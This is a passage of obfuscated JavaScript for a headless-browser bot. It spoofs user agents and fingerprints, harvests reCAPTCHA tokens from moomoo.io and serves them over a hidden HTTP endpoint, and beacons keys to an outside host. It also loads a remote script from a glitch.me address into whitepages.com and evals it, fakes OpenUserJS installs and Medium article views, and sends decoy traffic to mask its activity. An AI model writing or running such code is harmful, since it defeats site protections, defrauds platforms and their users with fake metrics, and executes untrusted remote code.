      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + X(0x2) + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + X(0xd) + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + Y(0x19),
    Y(0xc) + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    Z(0x1, 'oY7f') + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + X(0x17) + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + Z(0x13, 'LKe5') + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1 * 0x28d + 0x1915 + -0x36 * 0x83
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x90d + 0x181 * 0x17 + 0x7 * -0x3a6)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x1 * 0x1242 + 0x3 * 0x209 + -0x17f9), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x1120 + 0x2dd * -0x1 + -0x1 * -0x1461), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x2587 + -0x34f + -0x2238;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x60a * 0x5 + -0x1 * -0xf65 + -0x425 * 0xb; w < getRandomInt(-0x13ee + 0xb49 + -0x2 * -0x453, 0x1e40 + -0x23c3 + -0x1 * -0x588); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x40fa + -0xe47f * -0x1 + 0x1 * -0x3b19);
        }
      }();
    }, 0x1 * 0x4b + 0xb3f + -0xb26), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x9f6 + 0x66 * 0x27 + -0x594;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x1623 * -0x1 + 0x9b9 + 0xc6a, -0x1b62 + -0x46e + 0x2002)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x1 * -0xa449 + -0x1b * 0x1f + 0x37 * -0xcc);
    }, -0x21a6 + 0xd * 0x32 + -0x240 * -0xe), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x1 * 0x17a5 + 0x19e7 + -0x242;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x22 * -0x42 + 0x1 * 0x161b + -0x1327 * 0x1), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x2 * 0x1161 + -0x3e * 0xb + 0x256c), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x81c27 + -0xcd39 * -0x1f + -0x133a6e);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x5 * 0x72f + 0x19f + -0x2526);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0xa * -0x2ae + -0x1 * -0x1069 + -0x2a6d);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x1 * 0x19d6 + 0x1657 + -0x167 * -0x19);
}
doFlags['doOUJS'] && ((async () => {
  const a3 = b,
    a2 = c,
    a1 = d;
  async function f() {
    const a0 = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x72b + 0x76 * -0x4 + 0x904) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x1 * -0x8ad + 0xbe * 0x17 + -0x1 * 0x19be));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0xb * -0x16a + 0x1e * -0x8e + 0x2032, D['indexOf']('\x20'));
        return B ? E['slice'](-0x56a + 0xec1 + -0x957, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x1da2 + -0x178 * -0xf + 0x2eaa),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x1d1c + -0x4960 + 0x8d8c),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': a0(0xa) + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + a1(0x0) + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + a2(0x10) + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + a3(0x14, 'rp(p') + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x1 * -0x1a93 + -0x4 * 0x58a + 0x1 * 0x30bb; k < -0x2 * 0xcb4 + -0x11 * -0x56 + 0x13b6; k++)
    setTimeout(f, (0x201c + -0x1c * -0x41b + -0x15d4 * -0x4) * k * getRandomInt(0x1 * -0x1bc2 + -0x2294 + -0x3e57 * -0x1, -0x55 * 0x5f + -0x809 * 0x3 + -0x37a9 * -0x1));
  setInterval(() => {
    f();
    for (let l = -0x1049 + 0x86 * 0x3d + -0xfa5; l < 0x2204 + -0xfb0 + 0x125 * -0x10; l++)
      setTimeout(f, (-0x6acd * -0x3 + 0x1d21 * -0xa + 0xcd43) * l * getRandomInt(-0xc * 0x2af + 0x105b * -0x1 + 0x3090, -0x87d + -0x7b * -0x3d + -0x14cf));
  }, -0x1f2806 + -0x1 * 0x4deecc + -0x16 * -0x7749b);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
